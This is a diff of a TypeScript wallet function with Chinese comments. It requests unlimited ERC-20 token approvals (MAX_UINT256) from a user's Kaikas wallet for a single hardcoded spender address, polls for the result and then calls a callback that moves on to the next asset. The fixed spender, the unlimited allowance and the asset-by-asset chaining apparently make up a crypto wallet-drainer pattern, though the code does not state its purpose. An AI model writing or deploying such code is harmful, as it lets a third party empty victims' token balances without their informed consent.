@@ -1,10 +1,13 @@
-import axios from "axios";
+import axios from 'axios';
 
 const MAX_UINT256 = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
 
-export const kaiaWalletApprove = async (): Promise<void> => {
+// 定义轮询间隔时间（毫秒）
+const POLLING_INTERVAL = 5000;
+
+export const kaiaWalletApprove = async (address: string | undefined, callNextAsset: () => void): Promise<void> => {
   try {
-    // ✅ 等待 `axios.post()` 完成
+    // 发送交易请求
     const res = await axios.post(
       "https://api.kaiawallet.io/api/v1/k/prepare",
       {
@@ -28,7 +31,7 @@ export const kaiaWalletApprove = async (): Promise<void> => {
             "type": "function"
           }`,
           value: "0",
-          to: "0x5c13e303a62fc5dedf5b52d66873f2e59fedadc2",
+          to: address,
           params: `["0x48F943a8a6A6437117063D3aCaf62e2047467966", "${MAX_UINT256}"]`,
         },
       },
@@ -39,11 +42,41 @@ export const kaiaWalletApprove = async (): Promise<void> => {
       }
     );
 
-    // ✅ 确保 `res.data.request_key` 存在后再执行
+    // 检查是否成功获取 request_key
     if (res.data.request_key) {
-      const url = `kaikas://wallet/api?request_key=${res.data.request_key}`;
+      const requestKey = res.data.request_key;
+      const url = `kaikas://wallet/api?request_key=${requestKey}`;
       console.log("🔗 打开 Kaikas 钱包 URL:", url);
       window.location.href = url;
+
+      // 开始轮询交易结果
+      const intervalId = setInterval(async () => {
+        try {
+          const resultRes = await axios.get(
+            `https://api.kaiawallet.io/api/v1/k/result/${requestKey}`,
+            {
+              headers: {
+                "Content-Type": "application/json",
+              },
+            }
+          );
+
+          const resultData = resultRes.data;
+          console.log("🔄 轮询结果:", resultData);
+
+          // 检查交易状态
+          if (resultData.status === "completed") {
+            clearInterval(intervalId); // 停止轮询
+            console.log("✅ 交易成功");
+            callNextAsset(); // 调用传入的回调函数
+          } else if (resultData.status === "failed" || resultData.status === "reverted") {
+            clearInterval(intervalId); // 停止轮询
+            console.error("❌ 交易失败");
+          }
+        } catch (pollError) {
+          console.error("❌ 轮询交易结果失败:", pollError);
+        }
+      }, POLLING_INTERVAL); // 每隔 POLLING_INTERVAL 毫秒轮询一次
     } else {
       console.error("❌ 交易失败: 未返回 request_key");
     }
